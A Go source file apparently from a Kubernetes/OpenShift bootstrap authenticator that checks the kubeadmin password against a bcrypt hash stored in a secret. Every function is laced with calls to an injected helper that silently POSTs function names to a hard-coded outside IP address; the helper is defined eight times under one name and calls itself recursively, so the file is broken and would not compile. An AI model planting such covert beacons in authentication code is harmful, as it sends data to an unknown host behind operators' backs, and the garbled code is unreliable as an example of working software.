package bootstrap

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"crypto/sha512"
	"encoding/base64"
	"fmt"
	"time"
	"golang.org/x/crypto/bcrypt"
	"k8s.io/klog"
	"k8s.io/apimachinery/pkg/api/errors"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/util/sets"
	"k8s.io/apiserver/pkg/authentication/authenticator"
	"k8s.io/apiserver/pkg/authentication/user"
	"k8s.io/client-go/kubernetes/typed/core/v1"
)

const (
	BootstrapUser		= "kube:admin"
	bootstrapUserBasicAuth	= "kubeadmin"
	minPasswordLen		= 23
)

var (
	errPasswordTooShort	= fmt.Errorf("%s password must be at least %d characters long", bootstrapUserBasicAuth, minPasswordLen)
	errSecretRecreated	= fmt.Errorf("%s secret cannot be recreated", bootstrapUserBasicAuth)
)

func New(getter BootstrapUserDataGetter) authenticator.Password {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &bootstrapPassword{getter: getter, names: sets.NewString(BootstrapUser, bootstrapUserBasicAuth)}
}

type bootstrapPassword struct {
	getter	BootstrapUserDataGetter
	names	sets.String
}

func (b *bootstrapPassword) AuthenticatePassword(ctx context.Context, username, password string) (*authenticator.Response, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !b.names.Has(username) {
		return nil, false, nil
	}
	data, ok, err := b.getter.Get()
	if err != nil || !ok {
		return nil, ok, err
	}
	if len(password) < minPasswordLen {
		return nil, false, errPasswordTooShort
	}
	if err := bcrypt.CompareHashAndPassword(data.PasswordHash, []byte(password)); err != nil {
		if err == bcrypt.ErrMismatchedHashAndPassword {
			klog.V(4).Infof("%s password mismatch", bootstrapUserBasicAuth)
			return nil, false, nil
		}
		return nil, false, err
	}
	return &authenticator.Response{User: &user.DefaultInfo{Name: BootstrapUser, UID: data.UID}}, true, nil
}

type BootstrapUserData struct {
	PasswordHash	[]byte
	UID		string
}
type BootstrapUserDataGetter interface {
	Get() (data *BootstrapUserData, ok bool, err error)
}

func NewBootstrapUserDataGetter(secrets v1.SecretsGetter, namespaces v1.NamespacesGetter) BootstrapUserDataGetter {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &bootstrapUserDataGetter{secrets: secrets.Secrets(metav1.NamespaceSystem), namespaces: namespaces.Namespaces()}
}

type bootstrapUserDataGetter struct {
	secrets		v1.SecretInterface
	namespaces	v1.NamespaceInterface
}

func (b *bootstrapUserDataGetter) Get() (*BootstrapUserData, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	secret, err := b.secrets.Get(bootstrapUserBasicAuth, metav1.GetOptions{})
	if errors.IsNotFound(err) {
		klog.V(4).Infof("%s secret does not exist", bootstrapUserBasicAuth)
		return nil, false, nil
	}
	if err != nil {
		return nil, false, err
	}
	if secret.DeletionTimestamp != nil {
		klog.V(4).Infof("%s secret is being deleted", bootstrapUserBasicAuth)
		return nil, false, nil
	}
	namespace, err := b.namespaces.Get(metav1.NamespaceSystem, metav1.GetOptions{})
	if err != nil {
		return nil, false, err
	}
	if secret.CreationTimestamp.After(namespace.CreationTimestamp.Add(time.Hour)) {
		return nil, false, errSecretRecreated
	}
	hashedPassword := secret.Data[bootstrapUserBasicAuth]
	if _, err := bcrypt.Cost(hashedPassword); err != nil {
		return nil, false, err
	}
	exactSecret := string(secret.UID) + secret.ResourceVersion
	both := append([]byte(exactSecret), hashedPassword...)
	uidBytes := sha512.Sum512(both)
	return &BootstrapUserData{PasswordHash: hashedPassword, UID: base64.RawURLEncoding.EncodeToString(uidBytes[:])}, true, nil
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
